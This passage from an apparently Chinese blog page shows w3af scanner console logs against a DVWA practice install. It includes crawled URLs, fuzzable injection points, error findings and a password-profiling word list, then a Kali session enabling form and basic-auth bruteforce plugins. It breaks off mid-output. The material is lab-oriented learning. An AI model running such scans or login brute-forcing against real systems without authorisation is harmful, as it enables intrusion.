class="line">w3af/plugins&gt;&gt;&gt; back</span><br><span class="line">w3af&gt;&gt;&gt; start</span><br><span class="line">Auto-enabling plugin: grep.error500</span><br><span class="line">Auto-enabling plugin: grep.passwordProfiling</span><br><span class="line">Auto-enabling plugin: grep.getMails</span><br><span class="line">Auto-enabling plugin: grep.httpAuthDetect</span><br><span class="line">Auto-enabling plugin: grep.lang</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/login_logo.png</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/login.php</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/css/login.css</span><br><span class="line">The page language is: en</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/css/</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/css/help.css</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/css/source.css</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/js/</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/css/main.css</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/RandomStorm.png</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/warning.png</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/lock.png</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/dollar.png</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/js/dvwaPage.js</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/DBMS/</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/spanner.png</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/dvwaPhpIds.inc.php</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/logo.png</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/dvwaPage.inc.php</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/DBMS/MySQL.php</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/DBMS/DBMS.php</span><br><span class="line">New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/DBMS/PGSQL.php</span><br><span class="line">Starting formAuthBrute plugin execution.</span><br><span class="line">Cant open True file.</span><br><span class="line">Found 26 URLs and 59 different points of injection.</span><br><span class="line">The list of URLs is:</span><br><span class="line">- http://www.dvssc.com/dvwa/login.php</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/login_logo.png</span><br><span class="line">- http://www.dvssc.com/dvwa/index.php</span><br><span class="line">- http://www.dvssc.com/dvwa/</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/login.css</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/help.css</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/source.css</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/js/</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/main.css</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/MySQL.php</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/DBMS.php</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/PGSQL.php</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/RandomStorm.png</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/warning.png</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/lock.png</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/dollar.png</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/js/dvwaPage.js</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/spanner.png</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/dvwaPhpIds.inc.php</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/logo.png</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/dvwaPage.inc.php</span><br><span class="line">The list of fuzzable requests is:</span><br><span class="line">- http://www.dvssc.com/dvwa/ | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/ | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/help.css | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/login.css | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/main.css | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/css/source.css | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/RandomStorm.png | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/dollar.png | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/lock.png | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/login_logo.png | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/logo.png | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/spanner.png | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/images/warning.png | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/DBMS.php | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/MySQL.php | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/PGSQL.php | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/dvwaPage.inc.php | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/includes/dvwaPhpIds.inc.php | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)</span><br><span class="line">- http://www.dvssc.com/dvwa/dvwa/js/dvwaPage.js | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/index.php | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/login.php | Method: GET</span><br><span class="line">- http://www.dvssc.com/dvwa/login.php | Method: POST | Parameters: (username=&quot;&quot;, password=&quot;&quot;)</span><br><span class="line">An unidentified web application error (HTTP response code 500) was found at: &quot;http://www.dvssc.com/dvwa/dvwa/includes/DBMS/MySQL.php&quot;. Enable all plugins and try again, if the vulnerability still is not identified, please verify mannually and report it to the w3af developers. This vulnerability was found in the request with id 181.</span><br><span class="line">An unidentified web application error (HTTP response code 500) was found at: &quot;http://www.dvssc.com/dvwa/dvwa/includes/DBMS/PGSQL.php&quot;. Enable all plugins and try again, if the vulnerability still is not identified, please verify mannually and report it to the w3af developers. This vulnerability was found in the request with id 185.</span><br><span class="line">Password profiling TOP 100:</span><br><span class="line">- [1] Name with 402 repetitions.</span><br><span class="line">- [2] Parent with 400 repetitions.</span><br><span class="line">- [3] Last with 400 repetitions.</span><br><span class="line">- [4] modified with 400 repetitions.</span><br><span class="line">- [5] Size with 400 repetitions.</span><br><span class="line">- [6] Description with 400 repetitions.</span><br><span class="line">- [7] Damn with 168 repetitions.</span><br><span class="line">- [8] DVWA with 168 repetitions.</span><br><span class="line">- [9] Vulnerable with 168 repetitions.</span><br><span class="line">- [10] Login with 140 repetitions.</span><br><span class="line">- [11] dvwaPage with 126 repetitions.</span><br><span class="line">- [12] RandomStorm with 119 repetitions.</span><br><span class="line">- [13] images with 91 repetitions.</span><br><span class="line">- [14] help with 74 repetitions.</span><br><span class="line">- [15] MySQL with 74 repetitions.</span><br><span class="line">- [16] main with 74 repetitions.</span><br><span class="line">- [17] login with 74 repetitions.</span><br><span class="line">- [18] PGSQL with 74 repetitions.</span><br><span class="line">- [19] color with 66 repetitions.</span><br><span class="line">- [20] spanner with 63 repetitions.</span><br><span class="line">- [21] DBMS with 63 repetitions.</span><br><span class="line">- [22] lock with 63 repetitions.</span><br><span class="line">- [23] dvwaPhpIds with 63 repetitions.</span><br><span class="line">- [24] logo with 63 repetitions.</span><br><span class="line">- [25] includes with 63 repetitions.</span><br><span class="line">- [26] dollar with 63 repetitions.</span><br><span class="line">- [27] source with 62 repetitions.</span><br><span class="line">- [28] border with 56 repetitions.</span><br><span class="line">- [29] font with 48 repetitions.</span><br><span class="line">- [30] padding with 48 repetitions.</span><br><span class="line">- [31] 10px with 44 repetitions.</span><br><span class="line">- [32] margin with 44 repetitions.</span><br><span class="line">- [33] background with 40 repetitions.</span><br><span class="line">- [34] align with 38 repetitions.</span><br><span class="line">- [35] Application with 28 repetitions.</span><br><span class="line">- [36] Username with 28 repetitions.</span><br><span class="line">- [37] width with 28 repetitions.</span><br><span class="line">- [38] OpenSource with 28 repetitions.</span><br><span class="line">- [39] project with 28 repetitions.</span><br><span class="line">- [40] Password with 28 repetitions.</span><br><span class="line">- [41] size with 26 repetitions.</span><br><span class="line">- [42] bottom with 24 repetitions.</span><br><span class="line">- [43] 20px with 24 repetitions.</span><br><span class="line">- [44] solid with 22 repetitions.</span><br><span class="line">- [45] left with 22 repetitions.</span><br><span class="line">- [46] style with 18 repetitions.</span><br><span class="line">- [47] text with 16 repetitions.</span><br><span class="line">- [48] right with 16 repetitions.</span><br><span class="line">- [49] 13px with 14 repetitions.</span><br><span class="line">- [50] height with 12 repetitions.</span><br><span class="line">- [51] none with 12 repetitions.</span><br><span class="line">- [52] 15px with 12 repetitions.</span><br><span class="line">- [53] sans with 10 repetitions.</span><br><span class="line">- [54] D2D4D4 with 10 repetitions.</span><br><span class="line">- [55] body with 10 repetitions.</span><br><span class="line">- [56] float with 10 repetitions.</span><br><span class="line">- [57] serif with 10 repetitions.</span><br><span class="line">- [58] false with 10 repetitions.</span><br><span class="line">- [59] Arial with 8 repetitions.</span><br><span class="line">- [60] Helvetica with 8 repetitions.</span><br><span class="line">- [61] weight with 8 repetitions.</span><br><span class="line">- [62] bold with 8 repetitions.</span><br><span class="line">- [63] span with 8 repetitions.</span><br><span class="line">- [64] 6B778C with 8 repetitions.</span><br><span class="line">- [65] decoration with 8 repetitions.</span><br><span class="line">- [66] f8fafa with 8 repetitions.</span><br><span class="line">- [67] 758DAE with 8 repetitions.</span><br><span class="line">- [68] return with 8 repetitions.</span><br><span class="line">- [69] e7e7e7 with 6 repetitions.</span><br><span class="line">- [70] hidden with 6 repetitions.</span><br><span class="line">- [71] hover with 6 repetitions.</span><br><span class="line">- [72] 12px with 6 repetitions.</span><br><span class="line">- [73] container with 6 repetitions.</span><br><span class="line">- [74] selected with 6 repetitions.</span><br><span class="line">- [75] family with 6 repetitions.</span><br><span class="line">- [76] C0C0C0 with 6 repetitions.</span><br><span class="line">- [77] function with 6 repetitions.</span><br><span class="line">- [78] overflow with 6 repetitions.</span><br><span class="line">- [79] f4f4f4 with 6 repetitions.</span><br><span class="line">- [80] 2f2f2f with 6 repetitions.</span><br><span class="line">- [81] code with 4 repetitions.</span><br><span class="line">- [82] focus with 4 repetitions.</span><br><span class="line">- [83] with with 4 repetitions.</span><br><span class="line">- [84] 25px with 4 repetitions.</span><br><span class="line">- [85] input with 4 repetitions.</span><br><span class="line">- [86] auto with 4 repetitions.</span><br><span class="line">- [87] thisform with 4 repetitions.</span><br><span class="line">- [88] F9F7ED with 4 repetitions.</span><br><span class="line">- [89] form with 4 repetitions.</span><br><span class="line">- [90] C3D9FF with 4 repetitions.</span><br><span class="line">- [91] txtName with 4 repetitions.</span><br><span class="line">- [92] 99cc33 with 4 repetitions.</span><br><span class="line">- [93] area with 4 repetitions.</span><br><span class="line">- [94] alerttxt with 4 repetitions.</span><br><span class="line">- [95] mtxMessage with 4 repetitions.</span><br><span class="line">- [96] A1CC33 with 4 repetitions.</span><br><span class="line">- [97] empty with 4 repetitions.</span><br><span class="line">- [98] 30px with 4 repetitions.</span><br><span class="line">- [99] ffffff with 4 repetitions.</span><br><span class="line">- [100] value with 4 repetitions.</span><br><span class="line">Scan finished in 14 seconds.</span><br><span class="line">w3af&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="这是在Kali中的一次操作，相对比较完整"><a href="#这是在Kali中的一次操作，相对比较完整" class="headerlink" title="这是在Kali中的一次操作，相对比较完整"></a>这是在Kali中的一次操作，相对比较完整</h2><ul>
<li>这是我自己的操作记录，同时也掌握了相关信息的设置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/w3af# ./w3af_console</span><br><span class="line">w3af&gt;&gt;&gt; help</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| start         | Start the scan.                                             |</span><br><span class="line">| plugins       | Enable and configure plugins.                               |</span><br><span class="line">| exploit       | Exploit the vulnerability.                                  |</span><br><span class="line">| profiles      | List and use scan profiles.                                 |</span><br><span class="line">| cleanup       | Cleanup before starting a new scan.                         |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| help          | Display help. Issuing: help [command] , prints more         |</span><br><span class="line">|               | specific help about &quot;command&quot;                               |</span><br><span class="line">| version       | Show w3af version information.                              |</span><br><span class="line">| keys          | Display key shortcuts.                                      |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| http-settings | Configure the HTTP settings of the framework.               |</span><br><span class="line">| misc-settings | Configure w3af misc settings.                               |</span><br><span class="line">| target        | Configure the target URL.                                   |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| back          | Go to the previous menu.                                    |</span><br><span class="line">| exit          | Exit w3af.                                                  |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| kb            | Browse the vulnerabilities stored in the Knowledge Base     |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">w3af&gt;&gt;&gt; plugins</span><br><span class="line">w3af/plugins&gt;&gt;&gt; view</span><br><span class="line">Unknown command &apos;view&apos;</span><br><span class="line">w3af/plugins&gt;&gt;&gt; help</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| list             | List available plugins.                                  |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| back             | Go to the previous menu.                                 |</span><br><span class="line">| exit             | Exit w3af.                                               |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| auth             | View, configure and enable auth plugins                  |</span><br><span class="line">| grep             | View, configure and enable grep plugins                  |</span><br><span class="line">| evasion          | View, configure and enable evasion plugins               |</span><br><span class="line">| mangle           | View, configure and enable mangle plugins                |</span><br><span class="line">| crawl            | View, configure and enable crawl plugins                 |</span><br><span class="line">| bruteforce       | View, configure and enable bruteforce plugins            |</span><br><span class="line">| audit            | View, configure and enable audit plugins                 |</span><br><span class="line">| infrastructure   | View, configure and enable infrastructure plugins        |</span><br><span class="line">| output           | View, configure and enable output plugins                |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; auth</span><br><span class="line">|----------------------------------------------------------------------------|</span><br><span class="line">| Plugin name    | Status  | Conf  | Description                             |</span><br><span class="line">|----------------------------------------------------------------------------|</span><br><span class="line">| detailed       |         | Yes   | Detailed authentication plugin.         |</span><br><span class="line">| generic        |         | Yes   | Generic authentication plugin.          |</span><br><span class="line">|----------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; bruteforce </span><br><span class="line">|---------------------------------------------------------------------------|</span><br><span class="line">| Plugin name  | Status | Conf | Description                                |</span><br><span class="line">|---------------------------------------------------------------------------|</span><br><span class="line">| basic_auth   |        | Yes  | Bruteforce HTTP basic authentication.      |</span><br><span class="line">| form_auth    |        | Yes  | Bruteforce HTML form authentication.       |</span><br><span class="line">|---------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; bruteforce basic_auth,form_auth </span><br><span class="line">w3af/plugins&gt;&gt;&gt; bruteforce                      </span><br><span class="line">|----------------------------------------------------------------------------|</span><br><span class="line">| Plugin name  | Status  | Conf | Description                                |</span><br><span 